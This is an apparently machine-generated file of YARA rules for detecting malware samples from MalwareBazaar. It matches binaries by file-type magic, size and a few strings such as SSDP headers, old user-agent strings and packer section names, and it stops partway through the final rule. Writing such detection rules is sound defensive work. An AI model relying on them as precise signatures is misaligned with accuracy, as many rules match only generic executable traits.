rule Linux_c75281f91858e6e7ca1368754883588894de2a474bf7a32cc226af52d596277f
{
    meta:
        description = "Auto ML: c75281f91858e6e7ca1368754883588894de2a474bf7a32cc226af52d596277f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB
        and all of them
}

rule Linux_c75d7af60a0f2562ba324a8f0222f1e29790f7784685b2bc9597d8dffbd7e101
{
    meta:
        description = "Auto ML: c75d7af60a0f2562ba324a8f0222f1e29790f7784685b2bc9597d8dffbd7e101"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB
        and all of them
}

rule Windows_c7a55fa02d84ce165456e6edaaa1b1fc3c158a84defaa5ff2a669ac3153e5e29
{
    meta:
        description = "Auto ML: c7a55fa02d84ce165456e6edaaa1b1fc3c158a84defaa5ff2a669ac3153e5e29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D$$Pj@U"
        $s5 = "URSj@SPV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1107KB
        and all of them
}

rule Windows_c7c1f9e094890a135131fea3083df258c2d7c6375aab3061fdf0b1e5b9c3ba66
{
    meta:
        description = "Auto ML: c7c1f9e094890a135131fea3083df258c2d7c6375aab3061fdf0b1e5b9c3ba66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 886KB
        and all of them
}

rule Windows_c7c312035f6694f1941a1fc437a68c9c3e1aabdae242d1e3fd557dda53bdfcb0
{
    meta:
        description = "Auto ML: c7c312035f6694f1941a1fc437a68c9c3e1aabdae242d1e3fd557dda53bdfcb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB
        and all of them
}

rule Windows_c7cc77635eee4026d68f94cecbd1b92793de6ff0d8506c74b9c3a4bfe0c19541
{
    meta:
        description = "Auto ML: c7cc77635eee4026d68f94cecbd1b92793de6ff0d8506c74b9c3a4bfe0c19541"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".wedakug|"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB
        and all of them
}

rule Windows_c7ccb4a44b7cd5ddce78eec54a5e0c306bcd1a0154db447b0f3efbe4719ca4ba
{
    meta:
        description = "Auto ML: c7ccb4a44b7cd5ddce78eec54a5e0c306bcd1a0154db447b0f3efbe4719ca4ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "PQh\\6B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB
        and all of them
}

rule Linux_01a3c32b8cbafa4cb8d818e8c97035df9b31e3f162e1a926271f44b009074c39
{
    meta:
        description = "Auto ML: 01a3c32b8cbafa4cb8d818e8c97035df9b31e3f162e1a926271f44b009074c39"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB
        and all of them
}

rule Windows_1474f0ee2a0f2a806573cb3784d869de3d58d31d16c1fcdf2f4fc523336792e9
{
    meta:
        description = "Auto ML: 1474f0ee2a0f2a806573cb3784d869de3d58d31d16c1fcdf2f4fc523336792e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36023KB
        and all of them
}

rule Windows_c8036552ee5aa9ce1c45475a550bb73c67a4b767befc158d4e5212aab67aaf94
{
    meta:
        description = "Auto ML: c8036552ee5aa9ce1c45475a550bb73c67a4b767befc158d4e5212aab67aaf94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "M%ecWvCS"
        $s3 = "Pv:Q]f@"
        $s4 = "YO2Fk!o"
        $s5 = "tito#8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1839KB
        and all of them
}

rule Windows_c8412899f61e15fa2e4a88a289c7527758149f94693321bdf6673134795e7504
{
    meta:
        description = "Auto ML: c8412899f61e15fa2e4a88a289c7527758149f94693321bdf6673134795e7504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_c85533dc3627cc14b81a22fb204c42c9e5527e15ad78c832da7a159825de6ec7
{
    meta:
        description = "Auto ML: c85533dc3627cc14b81a22fb204c42c9e5527e15ad78c832da7a159825de6ec7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2261KB
        and all of them
}

rule Windows_c897c784626cb3d7748dc94bf3401205aa785efcef10a1e5534def1ab68a2f6f
{
    meta:
        description = "Auto ML: c897c784626cb3d7748dc94bf3401205aa785efcef10a1e5534def1ab68a2f6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4KB
        and all of them
}

rule Windows_c8b92119a5b562bbcea0562512a45db5a9695166b8950617604ced871f604bc0
{
    meta:
        description = "Auto ML: c8b92119a5b562bbcea0562512a45db5a9695166b8950617604ced871f604bc0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5322KB
        and all of them
}

rule Windows_c8f7cef323792b6b8bf74024704ad6add92b48d81c853b6cf41456bcc3519b10
{
    meta:
        description = "Auto ML: c8f7cef323792b6b8bf74024704ad6add92b48d81c853b6cf41456bcc3519b10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B.idata"
        $s3 = "@.themida"
        $s4 = "?_GwKD/"
        $s5 = "LN)$t\\S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3394KB
        and all of them
}

rule Windows_c96ebdb12684d0b47ebd0fa81aee556c8c981b942262d2169d9f63dc3b7e5a7c
{
    meta:
        description = "Auto ML: c96ebdb12684d0b47ebd0fa81aee556c8c981b942262d2169d9f63dc3b7e5a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 803KB
        and all of them
}

rule Windows_c9b54d5f8b3a9b1da0c9765305c3487351a8ac8f2c8683284ea632910e92e132
{
    meta:
        description = "Auto ML: c9b54d5f8b3a9b1da0c9765305c3487351a8ac8f2c8683284ea632910e92e132"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 785KB
        and all of them
}

rule Windows_c9be1ff9d80d934774556669459ad3242500a745531ba25f7c874f32f318cdd1
{
    meta:
        description = "Auto ML: c9be1ff9d80d934774556669459ad3242500a745531ba25f7c874f32f318cdd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1269KB
        and all of them
}

rule Windows_c9d75a27ed76fa8006bbfb067fca6f80506535a83914f7ae44e238c0f816c26d
{
    meta:
        description = "Auto ML: c9d75a27ed76fa8006bbfb067fca6f80506535a83914f7ae44e238c0f816c26d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<datetimeMenu_SelectedIndexChanged>b__13_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 649KB
        and all of them
}

rule Linux_149e50cf48fb35fab9ba319d734c4894a578e6a9d764cda6a63607dd41f656ef
{
    meta:
        description = "Auto ML: 149e50cf48fb35fab9ba319d734c4894a578e6a9d764cda6a63607dd41f656ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "I<Gw{*Zn1"
        $s2 = "V+h}*BF"
        $s3 = "F5JX^Gw"
        $s4 = "nnID6)"
        $s5 = "YSg<0|j"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Windows_c9faa7c09b54f1aeecbe5c9dfe92506891188002f0f7574490a8c58f310ad0b3
{
    meta:
        description = "Auto ML: c9faa7c09b54f1aeecbe5c9dfe92506891188002f0f7574490a8c58f310ad0b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.piff"
        $s5 = "`.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5634KB
        and all of them
}

rule Linux_c9fe7a1697c4be2afcf80c5ace26d7d3858403a7a3346110236f99ed1d80a7ec
{
    meta:
        description = "Auto ML: c9fe7a1697c4be2afcf80c5ace26d7d3858403a7a3346110236f99ed1d80a7ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB
        and all of them
}

rule Windows_ca040efdfa64cf6f1ed4a608427cb7ec730bd521dd54d02847cd45353f7b96ce
{
    meta:
        description = "Auto ML: ca040efdfa64cf6f1ed4a608427cb7ec730bd521dd54d02847cd45353f7b96ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "p;ZT2u"
        $s3 = "xoYJ\\ms"
        $s4 = ".'Vhhr"
        $s5 = "V[Jm}h5"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_ca0969a10ef9353ff9053efd4033b4d01eceb0c490e9b808108bd7740064f068
{
    meta:
        description = "Auto ML: ca0969a10ef9353ff9053efd4033b4d01eceb0c490e9b808108bd7740064f068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GGYe f\\"
        $s5 = "DD\"a N"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 365KB
        and all of them
}

rule Windows_ca0e2e53c24c4339d25101161f12eade64bb8d0624689aff35928ca6cbd3fc2f
{
    meta:
        description = "Auto ML: ca0e2e53c24c4339d25101161f12eade64bb8d0624689aff35928ca6cbd3fc2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "t$Gffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 394KB
        and all of them
}

rule Windows_ca62c0c61f385358ca0217b114e31eef2949f1ad95ed8604d756999dac40c643
{
    meta:
        description = "Auto ML: ca62c0c61f385358ca0217b114e31eef2949f1ad95ed8604d756999dac40c643"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SSShL@"
        $s5 = "HAK@KK"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB
        and all of them
}

rule Windows_ca648846b0c18d9ae93fa8053a4d87c6e7f9447e69c085cfc749a385c03f9627
{
    meta:
        description = "Auto ML: ca648846b0c18d9ae93fa8053a4d87c6e7f9447e69c085cfc749a385c03f9627"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6255KB
        and all of them
}

rule Windows_ca8a9bd612d1901bebd9bc1df651120ce8428238353f7ea694b8f1b09478f2c6
{
    meta:
        description = "Auto ML: ca8a9bd612d1901bebd9bc1df651120ce8428238353f7ea694b8f1b09478f2c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1231KB
        and all of them
}

rule Windows_ca9b7d7e6c9100b5f7987a56ade722b373343af8be2e498723219a8d6d993257
{
    meta:
        description = "Auto ML: ca9b7d7e6c9100b5f7987a56ade722b373343af8be2e498723219a8d6d993257"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "e`#@GRd"
        $s5 = "e`#@G5JZ44K8EG5GZST7HE57QR7"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 633KB
        and all of them
}

rule Windows_cac7ea634c540650c427a4b28bb1cd110f17dddc92ce15c9b7e7d5b118a99386
{
    meta:
        description = "Auto ML: cac7ea634c540650c427a4b28bb1cd110f17dddc92ce15c9b7e7d5b118a99386"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5092KB
        and all of them
}

rule Windows_149e9d049c83abff4843e0fab7f6cde552aef61e32a53d61e76f6c5adc3db25f
{
    meta:
        description = "Auto ML: 149e9d049c83abff4843e0fab7f6cde552aef61e32a53d61e76f6c5adc3db25f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "]9)([j+hi92-uhy!fl0$&ia9[_sdd[/j"
        $s4 = "XPR{=D"
        $s5 = "(Xj+hm92-"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1164KB
        and all of them
}

rule Android_cada4fc7c97ff0f3da057e253393e36345480051efb6ec1c448415ff908e3c21
{
    meta:
        description = "Auto ML: cada4fc7c97ff0f3da057e253393e36345480051efb6ec1c448415ff908e3c21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme"
        $s2 = "`1Z6(a~>U=$W"
        $s3 = "<c)0clM"
        $s4 = "T!g|5au"
        $s5 = "pEma]X"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 57796KB
        and all of them
}

rule Linux_caf40c1678b62e1fefa323b0c60604905258eca5f153d6bf51487d483463784c
{
    meta:
        description = "Auto ML: caf40c1678b62e1fefa323b0c60604905258eca5f153d6bf51487d483463784c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@sa4m.t"
        $s2 = "EZq|^4Q"
        $s3 = "DQ&N V"
        $s4 = "0adPC\""
        $s5 = "CEDdQj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 44KB
        and all of them
}

rule Windows_cb05f61ce4669963e3a556c8f7f4770ee82c5182bd265899abc2a0caaf2c4f10
{
    meta:
        description = "Auto ML: cb05f61ce4669963e3a556c8f7f4770ee82c5182bd265899abc2a0caaf2c4f10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "KDBM(k"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB
        and all of them
}

rule Windows_cb1ae846ff0cf850daca17d92289cbbcd099f5ea3b68c3f3877409b8c4df2b44
{
    meta:
        description = "Auto ML: cb1ae846ff0cf850daca17d92289cbbcd099f5ea3b68c3f3877409b8c4df2b44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 189KB
        and all of them
}

rule Windows_cb1c3a7659a975e2878f8a1737d412c18a83ba15ffbaa20cdda309a434150f7c
{
    meta:
        description = "Auto ML: cb1c3a7659a975e2878f8a1737d412c18a83ba15ffbaa20cdda309a434150f7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Them_Click_1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1092KB
        and all of them
}

rule Linux_cb30f47c6e8148a5a89a61577dd8f3f312d7f434022b4b1f54a1d6e649a236e1
{
    meta:
        description = "Auto ML: cb30f47c6e8148a5a89a61577dd8f3f312d7f434022b4b1f54a1d6e649a236e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "printf"
        $s4 = "connect"
        $s5 = "sigemptyset"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 45KB
        and all of them
}

rule Linux_cb6e47f38542b8527d75e508d073d8d5f060aab8951c854cf2c984ca017057bb
{
    meta:
        description = "Auto ML: cb6e47f38542b8527d75e508d073d8d5f060aab8951c854cf2c984ca017057bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "strcpy"
        $s4 = "connect"
        $s5 = "sigemptyset"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB
        and all of them
}

rule Windows_cb8c3014c82ec218c86dd1d3e022399658def5b6b3632ba99c6700d044d32fc6
{
    meta:
        description = "Auto ML: cb8c3014c82ec218c86dd1d3e022399658def5b6b3632ba99c6700d044d32fc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "sRich{"
        $s3 = "B.idata"
        $s4 = "@.themida"
        $s5 = "`.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 20760KB
        and all of them
}

rule Windows_cc26dca6301b50e3a5f5270ebbe9c1d797bb1f1f3205f7ade8e310a6f19e59c0
{
    meta:
        description = "Auto ML: cc26dca6301b50e3a5f5270ebbe9c1d797bb1f1f3205f7ade8e310a6f19e59c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".gisayi"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 191KB
        and all of them
}

rule Windows_cc3a1b5d38511917728521771d1c0137aa5851b35796ed74faf3d30124144277
{
    meta:
        description = "Auto ML: cc3a1b5d38511917728521771d1c0137aa5851b35796ed74faf3d30124144277"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1457KB
        and all of them
}

rule Linux_14b5be85dfdb18553e9bd92160a7107a89fb7df0dc8a8be450a29c3607d86ba9
{
    meta:
        description = "Auto ML: 14b5be85dfdb18553e9bd92160a7107a89fb7df0dc8a8be450a29c3607d86ba9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "/proc/net/route"
        $s5 = "(null)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 87KB
        and all of them
}

rule Windows_cc44b762d57a9c109e4255cb94fd3f550a18bc005a45aaed1ac9c99d806e6c20
{
    meta:
        description = "Auto ML: cc44b762d57a9c109e4255cb94fd3f550a18bc005a45aaed1ac9c99d806e6c20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".yokabe"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 723KB
        and all of them
}

rule Windows_cc658ef20e0e8a449f5e6028f8514db2d628f30d2d648cec718d69a1b61bd16e
{
    meta:
        description = "Auto ML: cc658ef20e0e8a449f5e6028f8514db2d628f30d2d648cec718d69a1b61bd16e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "com.apple.Safari"
        $s5 = "Unable to resolve HTTP prox"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 234KB
        and all of them
}

rule Windows_cc7ad818e9d4037c72b8cafeee214ecf2f6fe6c9af43ebfa221fb68cc7b5f966
{
    meta:
        description = "Auto ML: cc7ad818e9d4037c72b8cafeee214ecf2f6fe6c9af43ebfa221fb68cc7b5f966"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4322KB
        and all of them
}

rule Linux_cc89c9863a98c23561e39dcc055985d44eac4d135188350a7af98664a5d5d78a
{
    meta:
        description = "Auto ML: cc89c9863a98c23561e39dcc055985d44eac4d135188350a7af98664a5d5d78a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<T`X(}iJx|c"
        $s2 = "8|iJxTc"
        $s3 = "}#Kx}e[x8"
        $s4 = "+x}%KxD"
        $s5 = "QJD.QJ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Linux_ccb522743975c843639ce11f87a13aa9a687f5782b65368a0828372e74737921
{
    meta:
        description = "Auto ML: ccb522743975c843639ce11f87a13aa9a687f5782b65368a0828372e74737921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Hn$|jF"
        $s2 = "o]b$aO"
        $s3 = "j&\\nQV"
        $s4 = "V-l`nUPV"
        $s5 = "nA(<X4M"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB
        and all of them
}

rule Windows_cce4850cc383b394e43d8c7c4963d75a1611e1db82746b0515659c8db8cf0e1f
{
    meta:
        description = "Auto ML: cce4850cc383b394e43d8c7c4963d75a1611e1db82746b0515659c8db8cf0e1f"
